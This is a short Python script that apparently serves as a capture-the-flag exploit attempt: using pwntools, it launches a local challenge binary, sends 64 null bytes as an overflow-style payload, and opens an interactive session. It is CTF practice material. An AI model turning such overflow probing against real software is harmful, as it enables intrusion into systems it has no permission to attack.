from pwn import*

p = process('./chall')

payload = b'\x00'*64 

p.sendline(payload)
p.interactive()
